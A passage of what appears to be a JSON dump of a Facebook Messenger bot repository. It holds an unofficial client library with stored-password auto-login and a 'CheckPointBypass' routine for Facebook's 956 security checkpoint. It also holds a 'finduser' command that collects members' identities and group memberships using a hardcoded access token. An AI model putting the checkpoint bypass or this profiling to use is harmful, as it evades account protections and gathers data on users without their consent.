'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz/+0123456789';\n    var charactersLength = characters.length;\n    for ( var i = 0; i < length; i++ ) result += characters.charAt(Math.floor(Math.random() * charactersLength));\n    return result;\n  }\n\n  /**\n   * It returns a random number between the min and max values.\n   * @param min - The minimum number that can be generated.\n   * @param max - The maximum number that can be generated.\n   * @returns A random number between the min and max values.\n   */\n\n  function Between(min, max) { \n    return parseInt(Math.random() * (max - min) + min);\n  } \n\n  /**\n   * It creates a random number between 0 and 90, then subtracts a random number between 10 and 33 from\n   * it, and then adds 10 to it.\n   * \n   * So, the result is a number between -23 and 90.\n   * \n   * The function also creates a random number between 10 and 70, and a random number between 10 and 33.\n   * \n   * The function returns an object with the following properties:\n   * \n   * Security: the random number between 0 and 90\n   * Previous: the random number between -23 and 90\n   * Secret: the random number between 10 and 33\n   * Number: the random number between 10 and 70\n   * @returns An object with the following properties:\n   */\n\n  function CreateSecurity() {\n    var Security = Between(0,90);\n    var Secret = Between(10,33);\n    return {\n      Security: Security,\n      Previous: parseInt(Security) - Secret,//after + (10) main   + random\n      Secret: Secret, // save\n      Number: Between(10,50) // v·ªã tr√≠ c·ªßa real appstate tr·ª´ 10\n    };\n  }\n\n  /**\n   * It checks if the file exists, if it doesn't, it creates it and writes some data to it. If it does\n   * exist, it reads the data from it and returns it\n   * @param DefaultPassWord - The password you want to use.\n   * @returns An object with the following properties:\n   */\n\n  function CheckAndParse(DefaultPassWord) {\n    var PassWord = new Array();\n    if (!DefaultPassWord) return logger.Warning(\"DefaultPassWord Is Requirements\",function() { process.exit(0); });\n      try {\n        if (!Database().has('Security')) { \n          let Obj = CreateSecurity();\n          Database().set('Security',JSON.stringify(Obj));\n          for (let i = 1; i < 10; i ++) PassWord.push(ArrPassWord[parseInt(Obj.Security) + parseInt(i)]);\n          return { PassWord: String(DefaultPassWord) + \"-\" + String(PassWord.join('-')), Slot: Obj.Number ,Security: Obj.Security, Previous: Obj.Previous, Secret: Obj.Secret };\n        }\n        else {\n          var Data = JSON.parse(Database().get('Security'));\n          if (utils.getType(Data) == \"Object\") {\n            if (!Data.Security || !Data.Previous || !Data.Secret || !Data.Number) { \n              logger.Error('Data Deficit Detection, Reset Data');\n              let Obj = CreateSecurity();\n              Database().set('Security',JSON.stringify(Obj));\n              for (let i = 1; i < 10; i ++) PassWord.push(ArrPassWord[parseInt(Obj.Security) + parseInt(i)]);\n              return { PassWord: String(DefaultPassWord) + \"-\" + String(PassWord.join('-')), Slot: Obj.Number ,Security: Obj.Security, Previous: Obj.Previous, Secret: Obj.Secret };\n            }\n            else { \n              for (let i = 1; i < 10; i ++) PassWord.push(ArrPassWord[parseInt(Data.Security) + parseInt(i)]);\n              return { PassWord: String(DefaultPassWord) + \"-\" + String(PassWord.join('-')), Slot: Data.Number ,Security: Data.Security, Previous: Data.Previous, Secret: Data.Secret };\n            }\n          } \n        }\n      }\n    catch (e) {\n      logger.Error(\"Something went wrong: \" + e, function() {\n        let Obj = CreateSecurity();\n        Database().set('Security',JSON.stringify(Obj));\n        for (let i = 1; i < 10; i ++) PassWord.push(ArrPassWord[parseInt(Obj.Security) + parseInt(i)]);\n        return { PassWord: String(DefaultPassWord) + \"-\" + String(PassWord.join('-')), Slot: Obj.Number ,Security: Obj.Security, Previous: Obj.Previous, Secret: Obj.Secret };\n      });\n    }\n  }\n\n  /**\n   * CreatePassWord() takes a string and an object as arguments, and returns a string.\n   * @param DefaultPassWord - The default password that you want to use.\n   * @param ParseObj - This is the object that is being parsed.\n   * @returns A string of the DefaultPassWord and the PassWord array joined by a dash.\n   */\n\n  function CreatePassWord(DefaultPassWord,ParseObj) {\n    var PassWord = new Array();\n      for (let i = 1; i < 10; i ++) PassWord.push(ArrPassWord[parseInt(ParseObj.Security) + parseInt(i)]);\n    return String(DefaultPassWord) + \"-\" + String(PassWord.join('-'));\n  }\n\n  /* Encrypting the AppState with the PassWord. */\n\n  var Encrypt = (AppState,PassWord) => { \n    return require('./Step_3').encryptState(require('./Step_2').Encrypt(require('./Step_1').EncryptState(AppState,PassWord)),PassWord);\n  };\n\n  /* Decrypting the AppState. */\n\n  var Decrypt = (AppState,Slot,PassWord) => { \n    return require('./Step_1').DecryptState(require('./Step_2').Decrypt(require('./Step_3').decryptState(String(AppState[parseInt(Slot) - 10]),PassWord)),PassWord);\n  };\n\n  /* A module that is used to encrypt and decrypt the AppState. */\n\n  module.exports = function(AppState,DefaultPass,Type) { \n    switch (Type) {\n      case \"Encrypt\": {\n        var Data_Return;\n          if (!Already_Action.Encode.Status) {\n            if (Already_Action.First == 0) Already_Action.First = 1;\n            const Obj = CreateSecurity(),PassWord = CreatePassWord(DefaultPass,Obj),AppState_Encrypt = Encrypt(AppState,PassWord); Database().set('Security',JSON.stringify(Obj,null,2));\n            Data_Return = Array.from({length: 60}, (_,i) => { \n              if (i == (parseInt(Obj.Number) - 10)) { \n                return AppState_Encrypt; \n              } \n              else return Step_3.encryptState(CreateFakeType2(AppState_Encrypt.length),PassWord).slice(0,AppState_Encrypt.length);\n            });\n            Already_Action.Encode.Status = true;\n            Already_Action.Encode.Data = Data_Return;\n          }\n          else {\n            Data_Return = Already_Action.Encode.Data;\n          }\n        return Data_Return;\n      }\n      case \"Decrypt\": {\n        var AppState_Decrypt;\n          if (!Already_Action.Decode.Status) {\n            const Parse = CheckAndParse(DefaultPass);\n            AppState_Decrypt = Decrypt(AppState,Parse.Slot,Parse.PassWord);\n            if (Already_Action.First == 0) {\n              Already_Action.Encode.Status = true;\n              Already_Action.Encode.Data = AppState;\n            }\n            Already_Action.Decode.Status = true;\n            Already_Action.Decode.Data = AppState_Decrypt;\n          }\n          else {\n            AppState_Decrypt = Already_Action.Decode.Data;\n          }\n        return AppState_Decrypt;\n      }\n    }\n  };","path":null,"size_bytes":8107,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/sendTypingIndicator.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  function makeTypingIndicator(typ, threadID, callback, isGroup) {\n    var form = {\n      typ: +typ,\n      to: \"\",\n      source: \"mercury-chat\",\n      thread: threadID\n    };\n\n    // Check if thread is a single person chat or a group chat\n    // More info on this is in api.sendMessage\n    if (utils.getType(isGroup) == \"Boolean\") {\n      if (!isGroup) {\n        form.to = threadID;\n      }\n      defaultFuncs\n        .post(\"https://www.facebook.com/ajax/messaging/typ.php\", ctx.jar, form)\n        .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n        .then(function (resData) {\n          if (resData.error) throw resData;\n          return callback();\n        })\n        .catch(function (err) {\n          log.error(\"sendTypingIndicator\", err);\n          if (utils.getType(err) == \"Object\" && err.error === \"Not logged in\") {\n            ctx.loggedIn = false;\n          }\n          return callback(err);\n        });\n    }\n    else {\n      api.getUserInfo(threadID, function (err, res) {\n        if (err) return callback(err);\n        // If id is single person chat\n        if (Object.keys(res).length > 0) form.to = threadID;\n        defaultFuncs\n          .post(\"https://www.facebook.com/ajax/messaging/typ.php\", ctx.jar, form)\n          .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n          .then(function (resData) {\n            if (resData.error) throw resData;\n            return callback();\n          })\n          .catch(function (err) {\n            log.error(\"sendTypingIndicator\", err);\n            if (utils.getType(err) == \"Object\" && err.error === \"Not logged in.\") ctx.loggedIn = false;\n            return callback(err);\n          });\n      });\n    }\n  }\n\n  return function sendTypingIndicator(threadID, callback, isGroup) {\n    if (\n      utils.getType(callback) !== \"Function\" &&\n      utils.getType(callback) !== \"AsyncFunction\"\n    ) {\n      if (callback) log.warn(\"sendTypingIndicator\", \"callback is not a function - ignoring.\");\n      callback = () => { };\n    }\n\n    makeTypingIndicator(true, threadID, callback, isGroup);\n\n    return function end(cb) {\n      if (\n        utils.getType(cb) !== \"Function\" &&\n        utils.getType(cb) !== \"AsyncFunction\"\n      ) {\n        if (cb) log.warn(\"sendTypingIndicator\", \"callback is not a function - ignoring.\");\n        cb = () => { };\n      }\n\n      makeTypingIndicator(false, threadID, cb, isGroup);\n    };\n  };\n};\n","path":null,"size_bytes":2522,"size_tokens":null},"lib/Fca-Horizon-Remastered/Extra/ExtraUptimeRobot.js":{"content":"'use strict';\n\nconst logger = require(\"../logger\");\nmodule.exports = function() {\n    var Logger = global.Fca.Require.logger;\n    switch (process.platform) {\n        case 'win32': {\n            if (global.Fca.Require.FastConfig.Uptime) {\n                logger.Warning(global.Fca.Require.Language.ExtraUpTime.NotSupport);\n            }\n            break;\n        }\n        case 'darwin': {\n            if (global.Fca.Require.FastConfig.Uptime) {\n                logger.Warning(global.Fca.Require.Language.ExtraUpTime.NotSupport);\n            }\n            break;\n        }\n        case 'linux':\n            if (process.env.REPL_SLUG) {\n                var Value = global.Fca.Require.FastConfig;\n                var Fetch = global.Fca.Require.Fetch;\n                    if (Value.Uptime) {\n                        logger.Normal(global.Fca.Require.Language.ExtraUpTime.Uptime);//\n                        return setInterval(function() {\n                            Fetch.get(`https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co`);\n                        },10*1000);\n                    }\n                else return;\n            }\n            else { \n                Logger.Warning(global.Fca.Require.Language.ExtraUpTime.NotSupport);\n            }  \n            break;\n        default:\n        Logger.Warning(global.Fca.Require.Language.ExtraUpTime.NotSupport);\n    }\n};","path":null,"size_bytes":1384,"size_tokens":null},"lib/fca-auto/index.js":{"content":"'use strict';\n/* eslint-disable linebreak-style */\nconst utils = require('./utils');\nglobal.Fca = new Object({\n    isRestarting: false, // Add this line\n    isThread: new Array(),\n    isUser: new Array(),\n    startTime: Date.now(),\n    Setting: new Map(),\n    Version: require('./package.json').version,\n    Require: new Object({\n        fs: require(\"fs\"),\n        Fetch: require('got'),\n        log: require(\"npmlog\"),\n        utils: require(\"./utils.js\"),\n        logger: require('./logger.js'),\n        languageFile: require('./Language/index.json'),\n        Security: require('./Extra/Src/uuid.js')\n    }),\n    getText: function(/** @type {any[]} */...Data) {\n        var Main = (Data.splice(0,1)).toString();\n            for (let i = 0; i < Data.length; i++) Main = Main.replace(RegExp(`%${i + 1}`, 'g'), Data[i]);\n        return Main;\n    },\n    Data: new Object({\n        ObjFastConfig: {\n            \"Language\": \"vi\",\n            \"PreKey\": \"LunarKrystal\",\n            \"AutoUpdate\": false,\n            \"MainColor\": \"#9900FF\",\n            \"MainName\": \"[ FCA ]\",\n            \"Uptime\": false,\n            \"Config\": \"default\",\n            \"DevMode\": false,\n            \"Login2Fa\": false,\n            \"AutoLogin\": false,\n            \"BroadCast\": true,\n            \"AuthString\": \"\",\n            \"EncryptFeature\": true,\n            \"ResetDataLogin\": false,\n            \"AutoInstallNode\": true,\n            \"AntiSendAppState\": true,\n            \"AutoRestartMinutes\": 0,\n            \"RestartMQTT_Minutes\": 60,\n            \"Websocket_Extension\": {\n                \"Status\": false,\n                \"ResetData\": false,\n                \"AppState_Path\": \"appstate.json\"\n            },\n            \"HTML\": {   \n                \"HTML\": false,\n                \"UserName\": \"LunarKrystal\",\n                \"MusicLink\": \"https://files.catbox.moe/h6dtdh.mp3\"\n            },\n            \"AntiGetInfo\": {\n                \"Database_Type\": \"default\", //json or default\n                \"AntiGetThreadInfo\": false,\n                \"AntiGetUserInfo\": false\n            },\n            \"Stable_Version\": {\n                \"Accept\": false,\n                \"Version\": \"\"\n            },\n            \"CheckPointBypass\": {\n                \"956\": {\n                    \"Allow\": false,\n                    \"Difficult\": \"Easy\",\n                    \"Notification\": \"Turn on with AutoLogin!\"\n                }\n            },\n            \"AntiStuckAndMemoryLeak\": {\n                \"AutoRestart\": {\n                    \"Use\": false,\n                    \"Explain\": \"When this feature is turned on, the system will continuously check and confirm that if memory usage reaches 90%, it will automatically restart to avoid freezing or stopping.\"\n                },\n                \"LogFile\": {\n                    \"Use\": false,\n                    \"Explain\": \"Record memory usage logs to fix errors. Default location: Horizon_Database/memory.logs\"\n                }\n            }\n        },\n        CountTime: function() {\n            var fs = global.Fca.Require.fs;\n            if (fs.existsSync(__dirname + '/CountTime.json')) {\n                try {\n                    var data = Number(fs.readFileSync(__dirname + '/CountTime.json', 'utf8')),\n                    hours = Math.floor(data / (60 * 60));\n                }\n                catch (e) {\n                    fs.writeFileSync(__dirname + '/CountTime.json', 0);\n                    hours = 0;\n                }\n            }\n            else {\n                hours = 0;\n            }\n            return `${hours} Hours`;\n        }\n    }),\n    Action: async function(Type, ctx, Code, defaultFuncs) {\n        switch (Type) {\n            case \"AutoLogin\": {\n                var Database = require('./Extra/Database');\n                var logger = global.Fca.Require.logger;\n                var Email = (Database().get('Account')).replace(RegExp('\"', 'g'), ''); //hmm IDK\n                var PassWord = (Database().get('Password')).replace(RegExp('\"', 'g'), '');\n                require('./Main')({ email: Email, password: PassWord},async (error, api) => {\n                    if (error) {\n                        logger.Error(JSON.stringify(error,null,2), function() { logger.Error(\"AutoLogin Failed!\", function() { process.exit(0); }) });\n                    }\n                    try {\n                        Database().set(\"TempState\", Database().get('Through2Fa'));\n                    }\n                    catch(e) {\n                        logger.Warning(global.Fca.Require.Language.Index.ErrDatabase);\n                            logger.Error();\n                        process.exit(0);\n                    }\n                    process.exit(1);\n                });\n            }\n            break;\n            case \"Bypass\": {\n                const Bypass_Module = require(`./Extra/Bypass/${Code}`);\n                const logger = global.Fca.Require.logger;\n                switch (Code) {\n                    case 956: {\n                        async function P1() {\n                            return new Promise((resolve, reject) => {\n                                try {\n                                    utils.get('https://www.facebook.com/checkpoint/828281030927956/?next=https%3A%2F%2Faccountscenter.facebook.com%2Fpassword_and_security', ctx.jar, null, ctx.globalOptions).then(function(data) {\n                                        resolve(Bypass_Module.Check(data.body));    \n                                    })\n                                } \n                                catch (error) {\n                                    reject(error);\n                                }\n                            })\n                        }\n                        try {\n                            const test = await P1();\n                            if (test != null && test != '' && test != undefined) {\n                                const resp = await Bypass_Module.Cook_And_Work(ctx, defaultFuncs)\n                                if (resp == true) return logger.Success(\"Bypassing 956 successfully!\", function() { return process.exit(1); })\n                                else return logger.Error(\"Bypass 956 failed ! DO YOUR SELF :>\", function() { process.exit(0) });\n                            }\n                        }\n                        catch (e) {\n                            logger.Error(\"Bypass 956 failed ! DO YOUR SELF :>\", function() { process.exit(0) })\n                        }\n                    }\n                }\n            }\n            break;\n            default: {\n                require('npmlog').Error(\"Invalid Message!\");\n            };\n        }\n    }\n});\n\ntry {\n    let Boolean_Fca = [\"AntiSendAppState\",\"AutoUpdate\",\"Uptime\",\"BroadCast\",\"EncryptFeature\",\"AutoLogin\",\"ResetDataLogin\",\"Login2Fa\", \"DevMode\",\"AutoInstallNode\"];\n    let String_Fca = [\"MainName\",\"PreKey\",\"Language\",\"AuthString\",\"Config\"]\n    let Number_Fca = [\"AutoRestartMinutes\",\"RestartMQTT_Minutes\"];\n    let Object_Fca = [\"HTML\",\"Stable_Version\",\"AntiGetInfo\",\"Websocket_Extension\", \"CheckPointBypass\", \"AntiStuckAndMemoryLeak\"];\n    let All_Variable = Boolean_Fca.concat(String_Fca,Number_Fca,Object_Fca);\n\n\n    if (!global.Fca.Require.fs.existsSync(process.cwd() + '/FastConfigFca.json')) {\n        global.Fca.Require.fs.writeFileSync(process.cwd() + \"/FastConfigFca.json\", JSON.stringify(global.Fca.Data.ObjFastConfig, null, \"\\t\"));\n        process.exit(1);\n    }\n\ntry {\n    var Data_Setting = require(process.cwd() + \"/FastConfigFca.json\");\n}\ncatch (e) {\n    global.Fca.Require.logger.Error('Detect Your FastConfigFca Settings Invalid!, Carry out default restoration');\n    global.Fca.Require.fs.writeFileSync(process.cwd() + \"/FastConfigFca.json\", JSON.stringify(global.Fca.Data.ObjFastConfig, null, \"\\t\"));     \n    process.exit(1)\n}\n    if (global.Fca.Require.fs.existsSync(process.cwd() + '/FastConfigFca.json')) {\n        \n        for (let i of All_Variable) {\n            if (Data_Setting[i] == undefined) {\n                Data_Setting[i] = global.Fca.Data.ObjFastConfig[i];\n                global.Fca.Require.fs.writeFileSync(process.cwd() + \"/FastConfigFca.json\", JSON.stringify(Data_Setting, null, \"\\t\"));\n            }\n            else continue; \n        } //Check Variable\n\n        for (let i in Data_Setting) {\n            if (Boolean_Fca.includes(i)) {\n                if (global.Fca.Require.utils.getType(Data_Setting[i]) != \"Boolean\") logger.Error(i + \" Is Not A Boolean, Need To Be true Or false !\", function() { process.exit(0) });\n                else continue;\n            }\n            else if (String_Fca.includes(i)) {\n                if (global.Fca.Require.utils.getType(Data_Setting[i]) != \"String\") logger.Error(i + \" Is Not A String, Need To Be String!\", function() { process.exit(0) });\n                else continue;\n            }\n            else if (Number_Fca.includes(i)) {\n                if (global.Fca.Require.utils.getType(Data_Setting[i]) != \"Number\") logger.Error(i + \" Is Not A Number, Need To Be Number !\", function() { process.exit(0) });\n                else continue;\n            }\n            else if (Object_Fca.includes(i)) {\n                if (global.Fca.Require.utils.getType(Data_Setting[i]) != \"Object\") {\n                    Data_Setting[i] = global.Fca.Data.ObjFastConfig[i];\n                    global.Fca.Require.fs.writeFileSync(process.cwd() + \"/FastConfigFca.json\", JSON.stringify(Data_Setting, null, \"\\t\"));\n                }\n                else continue;\n            }\n        }\n\n        for (let i of Object_Fca) {\n            const All_Paths = utils.getPaths(global.Fca.Data.ObjFastConfig[i]);\n            const Mission = { Main_Path: i, Data_Path: All_Paths }\n            for (let i of Mission.Data_Path) {\n                if (Data_Setting[Mission.Main_Path] == undefined) {\n                    Data_Setting[Mission.Main_Path] = global.Fca.Data.ObjFastConfig[Mission.Main_Path];\n                    global.Fca.Require.fs.writeFileSync(process.cwd() + \"/FastConfigFca.json\", JSON.stringify(Data_Setting, null, \"\\t\"));      \n                }\n                const User_Data = (utils.getData_Path(Data_Setting[Mission.Main_Path], i, 0))\n                const User_Data_Type = utils.getType(User_Data);\n                if (User_Data_Type == \"Number\") {\n                    const Mission_Path = User_Data == 0 ? i : i.slice(0, User_Data); \n                    const Mission_Obj = utils.getData_Path(global.Fca.Data.ObjFastConfig[Mission.Main_Path], Mission_Path, 0);\n                    Data_Setting[Mission.Main_Path] = utils.setData_Path(Data_Setting[Mission.Main_Path], Mission_Path, Mission_Obj)\n                    global.Fca.Require.fs.writeFileSync(process.cwd() + \"/FastConfigFca.json\", JSON.stringify(Data_Setting, null, \"\\t\"));      \n                }\n            }\n        }\n\n        if (!global.Fca.Require.languageFile.some((/** @type {{ Language: string; }} */i) => i.Language == Data_Setting.Language)) { \n            global.Fca.Require.logger.Warning(\"Not Support Language: \" + Data_Setting.Language + \" Only 'en' and 'vi'\");\n            process.exit(0); \n        }\n        global.Fca.Require.Language = global.Fca.Require.languageFile.find((/** @type {{ Language: string; }} */i) => i.Language == Data_Setting.Language).Folder;\n    } else process.exit(1);\n    global.Fca.Require.FastConfig = Data_Setting;\n}\ncatch (e) {\n    console.log(e);\n    global.Fca.Require.logger.Error();\n}\n\nmodule.exports = function(loginData, options, callback) {\n    //const Language = global.Fca.Require.languageFile.find((/** @type {{ Language: string; }} */i) => i.Language == global.Fca.Require.FastConfig.Language).Folder.Index;\n    var login;\n    try {\n        login = require('./Main');\n    }\n    catch (e) {\n        console.log(e)\n    }\n\n require('./Extra/Database');\n\n    try {\n        login(loginData, options, callback);\n    }\n    catch (e) {\n        console.log(e)\n    }\n};","path":null,"size_bytes":11900,"size_tokens":null},"modules/commands/finduser.js":{"content":"const fs = require('fs');\nconst axios = require('axios');\n\nmodule.exports.config = {\n    name: \"finduser\",\n    version: \"1.1.0\",\n    hasPermssion: 0,\n    credits: \"TatsuYTB\",\n    description: \"T√¨m th√¥ng tin ng∆∞·ªùi d√πng trong c√°c nh√≥m bot tham gia\",\n    commandCategory: \"Ti·ªán √≠ch\",\n    usages: \"finduser <uid|name>\",\n    cooldowns: 10\n};\n\nmodule.exports.run = async ({ api, event, args, Users }) => {\n    const { threadID, messageID } = event;\n    if (args.length === 0) {\n        return api.sendMessage(\"‚ö†Ô∏è Vui l√≤ng nh·∫≠p UID ho·∫∑c t√™n ƒë·ªÉ t√¨m ki·∫øm.\", threadID, messageID);\n    }\n\n    const query = args.join(\" \").toLowerCase();\n    const isUID = /^\\d+$/.test(query);\n\n    const userResults = {};\n    const allThreads = await api.getThreadList(100, null, [\"INBOX\"]);\n\n    for (const thread of allThreads) {\n        const threadInfo = await api.getThreadInfo(thread.threadID);\n        const members = threadInfo.participantIDs || [];\n        \n        for (const memberID of members) {\n            try {\n                const userInfo = await Users.getData(memberID);\n                const userName = userInfo.name || \"Kh√¥ng r√µ\";\n                \n                if ((isUID && memberID === query) || (!isUID && userName.toLowerCase().includes(query))) {\n                    if (!userResults[memberID]) {\n                        userResults[memberID] = {\n                            name: userName,\n                            threads: []\n                        };\n                    }\n                    userResults[memberID].threads.push(threadInfo.threadName || \"Kh√¥ng r√µ\");\n                }\n            } catch (error) {\n                console.error(`Kh√¥ng th·ªÉ l·∫•y th√¥ng tin cho UID: ${memberID}`, error);\n            }\n        }\n    }\n\n    if (Object.keys(userResults).length === 0) {\n        return api.sendMessage(`‚ùé Kh√¥ng t√¨m th·∫•y ng∆∞·ªùi d√πng n√†o kh·ªõp v·ªõi \"${query}\".`, threadID, messageID);\n    }\n\n    let responseMessage = `üîé ƒê√£ t√¨m th·∫•y ${Object.keys(userResults).length} k·∫øt qu·∫£:\\n`;\n    const imagePaths = [];\n    for (const [uid, result] of Object.entries(userResults)) {\n        const imageUrl = `https://graph.facebook.com/${uid}/picture?height=720&width=720&access_token=6628568379%7Cc1e620fa708a1d5696fb991c1bde5662`;\n        const imagePath = __dirname + `/cache/${uid}.png`;\n\n        try {\n            const response = await axios.get(imageUrl, { responseType: \"arraybuffer\" });\n            fs.writeFileSync(imagePath, response.data);\n            imagePaths.push(imagePath);\n        } catch (error) {\n            console.error(`Kh√¥ng th·ªÉ t·∫£i ·∫£nh ƒë·∫°i di·ªán c·ªßa UID: ${uid}`, error);\n        }\n\n        const threadNames = result.threads.join(\", \");\n        responseMessage += `\\nüë§ T√™n: ${result.name}\\nüî∞ UID: ${uid}\\nüìù Nh√≥m: ${threadNames}\\nüåê Link FB: https://www.facebook.com/${uid}\\n`;\n    }\n\n    const attachments = imagePaths.map(path => fs.createReadStream(path));\n    api.sendMessage({ body: responseMessage, attachment: attachments }, threadID, () => {\n        imagePaths.forEach(path => fs.unlinkSync(path));\n    }, messageID);\n};\n","path":null,"size_bytes":3147,"size_tokens":null},"lib/fca-auto/Extra/Src/Instant_Update.js":{"content":"// module.exports = async function() {\n//     const got = require('got');\n//     const log = require('npmlog');\n//     const fs = require('fs');\n//     const Database = require('../Database')\n//     const { execSync } = require('child_process');\n//     //make request https://raw.githubusercontent.com/KanzuXHorizon/Fca-Horizon-Remastered/main/package.json\n//     const { body } = await got('https://raw.githubusercontent.com/KanzuXHorizon/Global_Horizon/main/InstantAction.json');\n//     const json = JSON.parse(body);\n//     const LocalVersion = require('../../package.json').version;\n//         if (Number(LocalVersion.replace(/\\./g,\"\")) < Number(json.Version.replace(/\\./g,\"\")) ) {\n//             log.warn(\"[ FCA-UPDATE ] ‚Ä¢\",\"Found a command that requires downloading an important Version to avoid errors, update onions: \" + LocalVersion + \" -> \" + json.Version);    \n//             log.warn(\"[ FCA-UPDATE ] ‚Ä¢\",\"Problem Description: \" + json.Problem);\n//             await new Promise(resolve => setTimeout(resolve, 3000));\n//             try {\n//                 execSync(`npm install fca-horizon-remastered@${json.Version}`, { stdio: 'inherit' });\n//                 log.info(\"[ FCA-UPDATE ] ‚Ä¢\",\"Update Complete, Restarting...\");\n//                 await new Promise(resolve => setTimeout(resolve, 3000));\n//                 Database(true).set(\"Instant_Update\", Date.now(), true);\n//                 await new Promise(resolve => setTimeout(resolve, 3000));\n//                 process.exit(1);\n//             }\n//             catch (err) {\n//                 try {\n//                     log.warn(\"[ FCA-UPDATE ] ‚Ä¢\",\"Update Failed, Trying Another Method 1...\");\n//                     await new Promise(resolve => setTimeout(resolve, 3000));\n//                     execSync(`npm install fca-horizon-remastered@${json.Version} --force`, { stdio: 'inherit' });\n//                     log.info(\"[ FCA-UPDATE ] ‚Ä¢\",\"Update Complete, Restarting...\");\n//                     await new Promise(resolve => setTimeout(resolve, 3000));\n//                     Database(true).set(\"Instant_Update\", Date.now());\n//                     await new Promise(resolve => setTimeout(resolve, 3000));\n//                     process.exit(1);\n//                 }\n//                 catch (err) {\n//                     try {\n//                         log.warn(\"[ FCA-UPDATE ] ‚Ä¢\",\"Update Failed, Trying to clean package cache...\");\n//                         await new Promise(resolve => setTimeout(resolve, 3000));\n//                         execSync('npm cache clean --force', { stdio: 'inherit' });\n//                         log.info(\"[ FCA-UPDATE ] ‚Ä¢\",\"Cache Cleaned, Trying Another Method 2...\");\n//                         await new Promise(resolve => setTimeout(resolve, 3000));\n//                         //self delete fca-horizon-remastered folder from node_modules\n//                         fs.rmdirSync((process.cwd() + \"/node_modules/fca-horizon-remastered\" || __dirname + '../../../fca-horizon-remastered'), { recursive: true });\n//                         await new Promise(resolve => setTimeout(resolve, 3000));\n//                         execSync(`npm install fca-horizon-remastered@${json.Version}`, { stdio: 'inherit' });\n//                         log.info(\"[ FCA-UPDATE ] ‚Ä¢\",\"Update Complete, Restarting...\");\n//                         await new Promise(resolve => setTimeout(resolve, 3000));\n//                         Database(true).set(\"Instant_Update\", Date.now());\n//                         await new Promise(resolve => setTimeout(resolve, 3000));\n//                         process.exit(1);\n//                     }\n//                     catch (e) {\n//                         console.log(e);\n//                         log.error(\"[ FCA-UPDATE ] ‚Ä¢\",\"Update Failed, Please Update Manually\");\n//                         await new Promise(resolve => setTimeout(resolve, 3000));\n//                         log.warn(\"[ FCA-UPDATE ] ‚Ä¢\",\"Please contact to owner about update failed and screentshot error log at fb.com/Lazic.Kanzu\");\n//                         await new Promise(resolve => setTimeout(resolve, 3000));\n//                         process.exit(1);\n//                     }\n//                 }\n//             }\n//         }\n//     else {\n//         return Database(true).set(\"NeedRebuild\", false);\n//     }\n// }","path":null,"size_bytes":4349,"size_tokens":null},"modules/commands/cosplay.js":{"content":"module.exports.config = {\n  name: \"cosplay\",\n  version: \"2.0.0\",\n  hasPermssion: 0,\n  credits: \"Vtuan\",\n  description: \"Xem ·∫£nh\",\n  commandCategory: \"Random-img\",\n  usages: \"\",\n  cooldowns: 30\n};\n\nmodule.exports.run = async ({ api, event ,Users}) => {\n  const axios = require('axios');\n  const request = require('request');\n  const fs = require(\"fs\");\n  const girl = require('./../../img/cosplay.json');\n  var image1 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image2 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image3 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image4 = girl[Math.floor(Math.random() * girl.length)].trim();\n  function downloadAndSendImage(image,fileName,callback){\n    request(image).pipe(fs.createWriteStream(__dirname + `/`+fileName)).on(\"close\", callback);\n  }\n  let callback = function () {\n    return api.sendMessage({\n      body: '·∫¢nh cosplay',\n      attachment: [\n       fs.createReadStream(__dirname + `/1.png`), \n       fs.createReadStream(__dirname + `/2.png`), \n       fs.createReadStream(__dirname + `/3.png`), \n       fs.createReadStream(__dirname + `/4.png`)\n      ]\n    }, event.threadID, () => {\n      fs.unlinkSync(__dirname + `/1.png`);\n      fs.unlinkSync(__dirname + `/2.png`);\n      fs.unlinkSync(__dirname + `/3.png`);\n      fs.unlinkSync(__dirname + `/4.png`);\n    }, event.messageID);\n  };\n  downloadAndSendImage(image1,'1.png',()=>{\n    downloadAndSendImage(image2,'2.png',()=>{\n      downloadAndSendImage(image3,'3.png',()=>{\n        downloadAndSendImage(image4,'4.png',callback)\n      })\n    })\n  }) \n}","path":null,"size_bytes":1606,"size_tokens":null},"lib/fca-auto/src/followUser.js":{"content":"\"use strict\";\n\nconst utils = require(\"../utils\");\nconst log = require(\"npmlog\");\n\nmodule.exports = function(defaultFuncs, api, ctx) {\n    \n    const methods = {\n        graphql: async function(userID) {\n            const form = {\n                av: ctx.userID,\n                fb_api_caller_class: \"RelayModern\",\n                fb_api_req_friendly_name: \"CometUserFollowMutation\", \n                doc_id: \"7111027605271938\",\n                variables: JSON.stringify({\n                    input: {\n                        attribution_id_v2: \"ProfileCometTimelineListViewRoot.react,comet.profile.timeline.list,via_cold_start,\" + Date.now(),\n                        is_tracking_encrypted: true,\n                        subscribe_location: \"PROFILE\",\n                        subscribee_id: userID,\n                        tracking: null,\n                        actor_id: ctx.userID,\n                        client_mutation_id: Math.round(Math.random() * 19).toString()\n                    },\n                    scale: 1\n                })\n            };\n\n            return defaultFuncs\n                .post(\"https://www.facebook.com/api/graphql/\", ctx.jar, form)\n                .then(utils.parseAndCheckLogin(ctx, defaultFuncs));\n        },\n\n        mqtt: async function(userID) {\n            return new Promise((resolve, reject) => {\n                const form = {\n                    av: ctx.userID,\n                    fb_api_req_friendly_name: \"follow\",\n                    fb_api_caller_class: \"RelayModern\",\n                    doc_id: \"4619896381447695\", \n                    variables: JSON.stringify({\n                        input: {\n                            subscribe_location: \"PROFILE\",\n                            subscribee_id: userID,\n                            actor_id: ctx.userID,\n                            client_mutation_id: utils.getSignatureID()\n                        }\n                    })\n                };\n\n                try {\n                    ctx.mqttClient.publish(\"/ls_req\", JSON.stringify({\n                        app_id: \"2220391788200892\",\n                        payload: JSON.stringify({\n                            tasks: [{\n                                label: 'follow_user',\n                                payload: JSON.stringify(form),\n                                task_id: Math.random() * 1001 << 0\n                            }],\n                            epoch_id: utils.generateOfflineThreadingID()\n                        }),\n                        request_id: ++ctx.req_ID,\n                        type: 3\n                    }));\n\n                    ctx.callback_Task[ctx.req_ID] = {\n                        callback: (err, data) => {\n                            if (err) reject(err);\n                            else resolve(data);\n                        },\n                        type: 